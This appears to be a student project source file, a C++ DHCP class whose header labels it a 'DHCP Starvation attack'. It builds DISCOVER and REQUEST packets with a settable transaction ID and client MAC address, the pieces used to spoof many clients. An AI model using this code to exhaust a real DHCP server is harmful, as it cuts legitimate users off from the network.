/*
 Computer Communications and Networks 2017/2018
 Project n. 2, variant 2 (DHCP Starvation attack)

 Autor: Erik Kelemen
*/

#include "dhcp.h"

dhcp::dhcp()
{
	create_discover_msg(12);
}

dhcp::~dhcp() {};	//implicit destructor

void dhcp::create_discover_msg(uint32_t id)
{
	memset(&m_data, 0, 552);

	m_data.op = dhcp_op::REQUEST;
	m_data.htype = dhcp_htype::Ethernet_10mb;
	m_data.hlen = 6;	//Ethernet uses 6 bytes for MAC addr

	m_data.xid = htonl(id);

	m_data.flags = htons(1 << 15);

	uint32_t magic_cookie = htonl(0x63825363);
	memcpy(m_data.options, &magic_cookie, 4);

	m_data.options[4]=53;	//Message type
	m_data.options[5]=1;	//len
	m_data.options[6]=1;	//DISCOVER

	m_data.options[7]=50;	//Requested IP address
	m_data.options[8]=4;

	m_data.options[13]=55;
	m_data.options[14]=4;

	m_data.options[15]=1;
	m_data.options[16]=3;
	m_data.options[17]=6;
	m_data.options[18]=42;

	m_data.options[22] = 255;
}

void dhcp::create_request_msg(uint32_t id, uint32_t addr)
{
	memset(&m_data, 0, 552);

	m_data.op = dhcp_op::REQUEST;
	m_data.htype = dhcp_htype::Ethernet_10mb;
	m_data.hlen = 6;	//Ethernet uses 6 bytes for MAC addr

	m_data.xid = htonl(id);

	m_data.flags = htons(1 << 15);

	uint32_t magic_cookie = htonl(0x63825363);
	memcpy(m_data.options, &magic_cookie, 4);

	m_data.options[4]=53;	//Message type
	m_data.options[5]=1;	//len
	m_data.options[6]=3;	//request

	m_data.options[7]=50;	//Requested IP address
	m_data.options[8]=4;

	uint32_t * option_pos = reinterpret_cast<uint32_t*>(&m_data.options[9]);
	*option_pos = addr;

	m_data.options[22] = 255;
}

void dhcp::set_xid(uint32_t xid)
{
	m_data.xid = htonl(xid);
}

void dhcp::set_chaddr_MAC(uint8_t MAC0, uint8_t MAC1, uint8_t MAC2, uint8_t MAC3, uint8_t MAC4, uint8_t MAC5)
{
	m_data.chaddr[0]= MAC0;
	m_data.chaddr[1]= MAC1;
	m_data.chaddr[2]= MAC2;
	m_data.chaddr[3]= MAC3;
	m_data.chaddr[4]= MAC4;
	m_data.chaddr[5]= MAC5;
}

void dhcp::commit(void * destination)
{
	memcpy(destination, &m_data, 263);
}